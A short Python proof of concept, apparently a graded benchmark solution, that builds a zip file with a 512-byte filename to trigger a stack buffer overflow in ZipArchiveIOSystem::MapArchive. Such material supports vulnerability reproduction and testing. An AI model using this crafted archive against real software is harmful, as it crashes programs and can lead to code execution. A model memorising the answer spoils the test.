import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in ZipArchiveIOSystem::MapArchive.
        
        The vulnerability is caused by copying a filename from the zip archive into a 
        256-byte stack buffer without bounds checking.
        """
        # Create an in-memory buffer to store the zip file
        zip_buffer = io.BytesIO()
        
        # Create a ZipFile object
        # We use ZIP_STORED to keep it simple, though the vulnerability is in the filename handling
        # which happens regardless of compression method.
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The buffer size is 256 bytes.
            # We need a filename larger than 256 bytes to trigger the overflow.
            # 512 bytes is chosen to reliably overwrite the stack frame (return address/saved frame pointer)
            # while keeping the total PoC size small for a high score.
            malicious_filename = "A" * 512
            
            # Add a file with the malicious filename to the zip archive.
            # The content of the file inside the zip can be empty.
            zf.writestr(malicious_filename, b"")
            
        return zip_buffer.getvalue()